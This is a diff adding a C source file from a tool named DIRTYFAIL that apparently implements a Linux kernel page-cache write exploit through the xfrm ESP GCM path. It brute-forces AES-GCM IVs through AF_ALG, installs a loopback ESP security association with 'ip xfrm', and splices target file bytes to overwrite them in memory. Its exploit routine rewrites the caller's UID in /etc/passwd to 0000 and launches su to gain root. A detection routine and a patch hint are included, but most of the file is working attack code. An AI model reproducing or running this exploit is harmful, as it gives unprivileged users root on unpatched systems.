@@ -1,0 +1,492 @@
+/*
+ * DIRTYFAIL — copyfail_gcm.c
+ *
+ * See copyfail_gcm.h for the design notes. This file implements:
+ *
+ *   1. AES-GCM keystream byte 0 computation via AF_ALG `gcm(aes)`.
+ *   2. IV brute force until keystream[0] equals the desired XOR mask.
+ *   3. SA installation via `ip xfrm state add ...` (system(3) — saves
+ *      ~150 lines of netlink boilerplate vs. our authencesn path; the
+ *      gcm primitive is the right place to take that dep, and every
+ *      modern distro ships iproute2).
+ *   4. Splice trigger: ESP wire header (16B) + 1 target byte + 16-byte
+ *      ICV pad. The kernel's in-place GCM decrypt XORs keystream[0]
+ *      onto the spliced page-cache byte, which is what we control.
+ */
+
+#include "copyfail_gcm.h"
+
+#include <fcntl.h>
+#include <pwd.h>
+#include <stdarg.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+#include <sys/uio.h>
+#include <sys/stat.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+
+#ifdef __linux__
+#include <sched.h>
+#include <sys/syscall.h>
+#include <linux/if.h>
+#include <sys/ioctl.h>
+
+extern ssize_t splice(int fd_in, loff_t *off_in, int fd_out, loff_t *off_out,
+                      size_t len, unsigned int flags);
+#endif
+
+#ifndef UDP_ENCAP
+#define UDP_ENCAP 100
+#endif
+#ifndef UDP_ENCAP_ESPINUDP
+#define UDP_ENCAP_ESPINUDP 2
+#endif
+
+#define ENCAP_PORT  4500
+#define ESP_SPI     0xCAFEBABE
+#define IV_LEN      8
+#define ICV_LEN     16
+#define AES_KEY_LEN 16
+#define SALT_LEN    4
+#define KEY_TOTAL   (AES_KEY_LEN + SALT_LEN)   /* rfc4106 expects 20 */
+
+/* Fixed AEAD key (16-byte AES key + 4-byte salt). Both are attacker-
+ * chosen — auth verification will fail at the end of decrypt anyway,
+ * the STORE has already happened by then. */
+static const unsigned char AEAD_KEY[KEY_TOTAL] = {
+    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
+    0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
+    0x10, 0x11, 0x12, 0x13,
+};
+
+/* ---------------------------------------------------------------- *
+ * Detection
+ * ---------------------------------------------------------------- */
+
+df_result_t copyfail_gcm_detect(void)
+{
+    log_step("Copy Fail GCM variant — detection");
+
+    int km, kn;
+    if (kernel_version(&km, &kn))
+        log_hint("kernel %d.%d.x", km, kn);
+
+    /* Probe AF_ALG availability of rfc4106(gcm(aes)). */
+    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (s < 0) {
+        log_ok("AF_ALG unavailable — GCM variant unreachable");
+        return DF_PRECOND_FAIL;
+    }
+    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
+    strncpy((char *)sa.salg_type, "aead",                 sizeof(sa.salg_type) - 1);
+    strncpy((char *)sa.salg_name, "rfc4106(gcm(aes))",    sizeof(sa.salg_name) - 1);
+    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        log_ok("rfc4106(gcm(aes)) not loadable — GCM variant unreachable");
+        close(s);
+        return DF_PRECOND_FAIL;
+    }
+    close(s);
+    log_ok("AF_ALG + rfc4106(gcm(aes)) loadable");
+
+    bool userns = unprivileged_userns_allowed();
+    log_hint("unprivileged user namespace: %s", userns ? "allowed" : "DENIED");
+
+    if (!userns) {
+        log_warn("preconditions partial — userns blocked. Try with --aa-bypass.");
+        return DF_PRECOND_FAIL;
+    }
+
+    log_warn("VULNERABLE — GCM-variant of xfrm-ESP page-cache write reachable");
+    log_warn("apply mainline patch f4c50a4034e6 or distro backport");
+    return DF_VULNERABLE;
+}
+
+/* ---------------------------------------------------------------- *
+ * AES-GCM keystream byte 0 via AF_ALG
+ *
+ * To compute keystream[0] for a given (key, salt, iv):
+ *   1. Bind AF_ALG socket to "gcm(aes)" with key=AES_KEY (16B).
+ *   2. AAD = empty, IV = salt(4) || iv(8) (12-byte nonce).
+ *   3. Encrypt 1 byte of plaintext = 0x00.
+ *   4. Output is 1 byte ct + 16-byte tag; ct = keystream[0] (since
+ *      keystream XOR 0 = keystream).
+ * ---------------------------------------------------------------- */
+
+#ifdef __linux__
+
+static int gcm_open(void)
+{
+    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
+    if (s < 0) return -1;
+    struct sockaddr_alg_compat sa = { .salg_family = AF_ALG };
+    strncpy((char *)sa.salg_type, "aead",      sizeof(sa.salg_type) - 1);
+    strncpy((char *)sa.salg_name, "gcm(aes)",  sizeof(sa.salg_name) - 1);
+    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+        close(s); return -1;
+    }
+    if (setsockopt(s, SOL_ALG, ALG_SET_KEY,
+                   AEAD_KEY, AES_KEY_LEN) < 0) {  /* AES key only, no salt */
+        close(s); return -1;
+    }
+    /* Set the auth tag length we'll receive. */
+    unsigned int taglen = ICV_LEN;
+    if (setsockopt(s, SOL_ALG, ALG_SET_AEAD_AUTHSIZE,
+                   &taglen, sizeof(taglen)) < 0) {
+        close(s); return -1;
+    }
+    return s;
+}
+
+/* AF_ALG IV layout: u32 ivlen + iv bytes. */
+struct dfg_alg_iv {
+    uint32_t ivlen;
+    uint8_t  iv[12];
+} __attribute__((packed));
+
+static bool gcm_keystream_byte0(int gcm_s, const uint8_t nonce[12],
+                                uint8_t *out_byte)
+{
+    int op = accept(gcm_s, NULL, NULL);
+    if (op < 0) return false;
+
+    char cbuf[CMSG_SPACE(sizeof(unsigned int))
+            + CMSG_SPACE(sizeof(struct dfg_alg_iv))
+            + CMSG_SPACE(sizeof(unsigned int))] = {0};
+
+    unsigned int op_enc   = ALG_OP_ENCRYPT;
+    unsigned int assoclen = 0;
+
+    struct msghdr msg = { .msg_control = cbuf, .msg_controllen = sizeof(cbuf) };
+
+    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
+    c->cmsg_level = SOL_ALG;
+    c->cmsg_type  = ALG_SET_OP;
+    c->cmsg_len   = CMSG_LEN(sizeof(unsigned int));
+    memcpy(CMSG_DATA(c), &op_enc, sizeof(op_enc));
+
+    c = CMSG_NXTHDR(&msg, c);
+    c->cmsg_level = SOL_ALG;
+    c->cmsg_type  = ALG_SET_IV;
+    c->cmsg_len   = CMSG_LEN(sizeof(struct dfg_alg_iv));
+    struct dfg_alg_iv *aiv = (struct dfg_alg_iv *)CMSG_DATA(c);
+    aiv->ivlen = 12;
+    memcpy(aiv->iv, nonce, 12);
+
+    c = CMSG_NXTHDR(&msg, c);
+    c->cmsg_level = SOL_ALG;
+    c->cmsg_type  = ALG_SET_AEAD_ASSOCLEN;
+    c->cmsg_len   = CMSG_LEN(sizeof(unsigned int));
+    memcpy(CMSG_DATA(c), &assoclen, sizeof(assoclen));
+
+    uint8_t pt = 0;
+    struct iovec iov = { .iov_base = &pt, .iov_len = 1 };
+    msg.msg_iov = &iov; msg.msg_iovlen = 1;
+
+    if (sendmsg(op, &msg, 0) < 0) { close(op); return false; }
+
+    uint8_t out[1 + ICV_LEN];
+    ssize_t n = read(op, out, sizeof(out));
+    close(op);
+    if (n < 1) return false;
+    *out_byte = out[0];
+    return true;
+}
+
+/* Brute force IV until keystream byte equals want_ks. Returns iters
+ * tried; writes the winning 8-byte IV into iv_out. */
+static int64_t gcm_brute_iv(uint8_t want_ks, uint8_t iv_out[IV_LEN])
+{
+    int s = gcm_open();
+    if (s < 0) {
+        log_bad("gcm_open: %s", strerror(errno));
+        return -1;
+    }
+    uint8_t nonce[12];
+    memcpy(nonce, AEAD_KEY + AES_KEY_LEN, SALT_LEN);  /* salt prefix */
+
+    for (uint64_t v = 1; v < (1ULL << 32); v++) {
+        memcpy(nonce + SALT_LEN, &v, IV_LEN);  /* low 8 bytes */
+        uint8_t ks;
+        if (!gcm_keystream_byte0(s, nonce, &ks)) {
+            close(s);
+            return -1;
+        }
+        if (ks == want_ks) {
+            memcpy(iv_out, &v, IV_LEN);
+            close(s);
+            return (int64_t)v;
+        }
+        if ((v & 0xFFF) == 0 && v > 16384) {
+            /* progress hint after 16k attempts (very unlucky case). */
+            log_hint("gcm IV brute: %llu trials so far...",
+                     (unsigned long long)v);
+        }
+    }
+    close(s);
+    return -1;
+}
+
+/* ---------------------------------------------------------------- *
+ * SA install via `ip xfrm state add ...`
+ * ---------------------------------------------------------------- */
+
+static bool ip_run(const char *fmt, ...)
+{
+    char cmd[2048];
+    va_list ap;
+    va_start(ap, fmt);
+    vsnprintf(cmd, sizeof(cmd), fmt, ap);
+    va_end(ap);
+    int rc = system(cmd);
+    return rc == 0;
+}
+
+static bool gcm_install_sa(const uint8_t iv[IV_LEN])
+{
+    char keyhex[KEY_TOTAL * 2 + 3];
+    char *p = keyhex;
+    p += sprintf(p, "0x");
+    for (int i = 0; i < KEY_TOTAL; i++)
+        p += sprintf(p, "%02x", AEAD_KEY[i]);
+
+    /* `ip xfrm state add` registers a transport-mode ESP SA over
+     * loopback with rfc4106(gcm(aes)) AEAD. Encap is ESPINUDP/4500
+     * matching what we'll send via splice. */
+    (void)iv;  /* IV travels in the wire packet, not the SA. */
+    return ip_run(
+        "ip link set lo up >/dev/null 2>&1 ; "
+        "ip xfrm state flush >/dev/null 2>&1 ; "
+        "ip xfrm state add src 127.0.0.1 dst 127.0.0.1 proto esp "
+        "spi 0x%08x encap espinudp %d %d 0.0.0.0 "
+        "aead 'rfc4106(gcm(aes))' %s 128 replay-window 32 >/dev/null 2>&1",
+        ESP_SPI, ENCAP_PORT, ENCAP_PORT, keyhex);
+}
+
+/* ---------------------------------------------------------------- *
+ * Splice trigger
+ * ---------------------------------------------------------------- */
+
+static bool gcm_trigger(const char *target_path, off_t target_off,
+                        const uint8_t iv[IV_LEN])
+{
+    int rs = socket(AF_INET, SOCK_DGRAM, 0);
+    if (rs < 0) return false;
+    int encap = UDP_ENCAP_ESPINUDP;
+    setsockopt(rs, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap));
+    struct sockaddr_in la = {
+        .sin_family = AF_INET,
+        .sin_port   = htons(ENCAP_PORT),
+        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
+    };
+    int reuse = 1;
+    setsockopt(rs, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
+    if (bind(rs, (struct sockaddr *)&la, sizeof(la)) < 0) {
+        close(rs); return false;
+    }
+
+    /* Build attacker page in /tmp: ESP header(16) + ICV pad at offset
+     * 4096. We splice these from a real file so the kernel sees them
+     * as page-cache pages on the splice path. */
+    char atkpath[64];
+    snprintf(atkpath, sizeof(atkpath), "/tmp/dirtyfail-gcm.%d", (int)getpid());
+    unlink(atkpath);
+    int afd = open(atkpath, O_RDWR | O_CREAT | O_EXCL, 0600);
+    if (afd < 0) { close(rs); return false; }
+
+    unsigned char esp_hdr[16];
+    *(uint32_t *)(esp_hdr + 0) = htonl(ESP_SPI);
+    *(uint32_t *)(esp_hdr + 4) = htonl(1);             /* SeqNum */
+    memcpy(esp_hdr + 8, iv, IV_LEN);
+    if (pwrite(afd, esp_hdr, 16, 0) != 16) goto fail;
+
+    unsigned char icv[ICV_LEN] = {0};
+    if (pwrite(afd, icv, ICV_LEN, 4096) != ICV_LEN) goto fail;
+    fsync(afd);
+#ifdef POSIX_FADV_DONTNEED
+    posix_fadvise(afd, 0, 0, POSIX_FADV_DONTNEED);
+#endif
+
+    int afd2 = open(atkpath, O_RDONLY);
+    if (afd2 < 0) goto fail;
+    unlink(atkpath);
+
+    int tfd = open(target_path, O_RDONLY);
+    if (tfd < 0) { close(afd2); goto fail; }
+
+    int p[2];
+    if (pipe(p) < 0) { close(afd2); close(tfd); goto fail; }
+    fcntl(p[0], F_SETPIPE_SZ, 1 << 20);
+    fcntl(p[1], F_SETPIPE_SZ, 1 << 20);
+
+    /* esp_hdr (16) || target_byte (1) || icv_pad (16) — 33 bytes total. */
+    loff_t off;
+    off = 0;       if (splice(afd2, &off, p[1], NULL, 16, 0) != 16) goto trig_fail;
+    off = target_off; if (splice(tfd,  &off, p[1], NULL, 1, 0) != 1) goto trig_fail;
+    off = 4096;    if (splice(afd2, &off, p[1], NULL, 16, 0) != 16) goto trig_fail;
+
+    int ss = socket(AF_INET, SOCK_DGRAM, 0);
+    if (ss < 0) goto trig_fail;
+    if (connect(ss, (struct sockaddr *)&la, sizeof(la)) < 0) { close(ss); goto trig_fail; }
+    ssize_t sent = splice(p[0], NULL, ss, NULL, 16 + 1 + 16, 0);
+    (void)sent;
+    close(ss);
+    close(p[0]); close(p[1]);
+
+    /* Drive recv (esp_input fires synchronously in the loopback path,
+     * but receiving makes the kernel run through it deterministically). */
+    usleep(50000);
+    unsigned char drain[256];
+    (void)recv(rs, drain, sizeof(drain), MSG_DONTWAIT);
+
+    close(afd2); close(tfd); close(afd); close(rs);
+    return true;
+
+trig_fail:
+    close(p[0]); close(p[1]); close(afd2); close(tfd);
+fail:
+    close(afd); close(rs);
+    unlink(atkpath);
+    return false;
+}
+
+/* ---------------------------------------------------------------- *
+ * Public 1-byte primitive
+ * ---------------------------------------------------------------- */
+
+bool cfg_1byte_write(const char *target_path,
+                     off_t target_off, unsigned char want_byte)
+{
+    /* Read current byte. */
+    int tfd = open(target_path, O_RDONLY);
+    if (tfd < 0) {
+        log_bad("open %s: %s", target_path, strerror(errno));
+        return false;
+    }
+    unsigned char cur = 0;
+    if (pread(tfd, &cur, 1, target_off) != 1) {
+        log_bad("pread current: %s", strerror(errno));
+        close(tfd); return false;
+    }
+    close(tfd);
+
+    if (cur == want_byte) {
+        return true;   /* already what we want */
+    }
+
+    uint8_t want_ks = cur ^ want_byte;
+
+    /* Brute force IV via AF_ALG. */
+    uint8_t iv[IV_LEN];
+    int64_t iters = gcm_brute_iv(want_ks, iv);
+    if (iters < 0) {
+        log_bad("gcm IV brute force failed (want_ks=0x%02x)", want_ks);
+        return false;
+    }
+
+    /* Install SA. */
+    if (!gcm_install_sa(iv)) {
+        log_bad("ip xfrm state add failed");
+        return false;
+    }
+
+    /* Trigger. */
+    if (!gcm_trigger(target_path, target_off, iv)) {
+        log_bad("gcm trigger failed");
+        return false;
+    }
+
+    /* Verify. */
+    int v = open(target_path, O_RDONLY);
+    if (v < 0) return false;
+    unsigned char post = 0;
+    if (pread(v, &post, 1, target_off) != 1) { close(v); return false; }
+    close(v);
+    if (post != want_byte) {
+        log_bad("byte at off=%lld is 0x%02x, wanted 0x%02x",
+                (long long)target_off, post, want_byte);
+        return false;
+    }
+    return true;
+}
+
+#else  /* !__linux__ */
+bool cfg_1byte_write(const char *p, off_t o, unsigned char b)
+{ (void)p; (void)o; (void)b; return false; }
+#endif
+
+/* ---------------------------------------------------------------- *
+ * Top-level exploit (UID flip end-to-end)
+ * ---------------------------------------------------------------- */
+
+df_result_t copyfail_gcm_exploit(bool do_shell)
+{
+    log_step("Copy Fail GCM variant — exploit");
+
+    if (getuid() == 0) {
+        log_warn("already root");
+        return DF_OK;
+    }
+
+    struct passwd *pw = getpwuid(getuid());
+    if (!pw) { log_bad("getpwuid: %s", strerror(errno)); return DF_TEST_ERROR; }
+    const char *user = pw->pw_name;
+
+    off_t  uid_off; size_t uid_len; char uid_str[16];
+    if (!find_passwd_uid_field(user, &uid_off, &uid_len, uid_str)) {
+        log_bad("user %s not found in /etc/passwd", user);
+        return DF_TEST_ERROR;
+    }
+    log_step("/etc/passwd UID for %s: '%s' at offset %lld",
+             user, uid_str, (long long)uid_off);
+    if (uid_len != 4) {
+        log_bad("UID '%s' is %zu chars; need 4", uid_str, uid_len);
+        return DF_TEST_ERROR;
+    }
+
+    log_warn("about to flip /etc/passwd UID via rfc4106(gcm(aes)) byte-flips");
+    log_warn("(four 1-byte writes — one per UID digit not already '0')");
+    if (!typed_confirm("DIRTYFAIL")) {
+        log_bad("confirmation declined");
+        return DF_OK;
+    }
+
+    /* Flip each UID byte to '0'. We're already in the bypass userns
+     * (main() handled --aa-bypass), so we have CAP_NET_ADMIN here. */
+    for (size_t i = 0; i < 4; i++) {
+        if (uid_str[i] == '0') continue;
+        log_step("flip /etc/passwd[%lld] '%c' -> '0'",
+                 (long long)(uid_off + i), uid_str[i]);
+        if (!cfg_1byte_write("/etc/passwd", uid_off + i, '0')) {
+            log_bad("byte flip failed at offset %lld",
+                    (long long)(uid_off + i));
+            return DF_EXPLOIT_FAIL;
+        }
+    }
+
+    /* Verify */
+    int v = open("/etc/passwd", O_RDONLY);
+    if (v < 0) return DF_EXPLOIT_FAIL;
+    if (lseek(v, uid_off, SEEK_SET) != uid_off) { close(v); return DF_EXPLOIT_FAIL; }
+    char land[5] = {0};
+    if (read(v, land, 4) != 4) { close(v); return DF_EXPLOIT_FAIL; }
+    close(v);
+    if (memcmp(land, "0000", 4) != 0) {
+        log_bad("verify: page cache reads '%.4s'", land);
+        return DF_EXPLOIT_FAIL;
+    }
+    log_ok("page cache now reports %s with uid 0 (via GCM path)", user);
+
+    if (!do_shell) {
+#ifdef POSIX_FADV_DONTNEED
+        int e = open("/etc/passwd", O_RDONLY);
+        if (e >= 0) { posix_fadvise(e, 0, 0, POSIX_FADV_DONTNEED); close(e); }
+#endif
+        return DF_EXPLOIT_OK;
+    }
+
+    log_ok("invoking 'su %s' — enter your own password", user);
+    execlp("su", "su", user, (char *)NULL);
+    log_bad("execlp: %s", strerror(errno));
+    return DF_EXPLOIT_FAIL;
+}
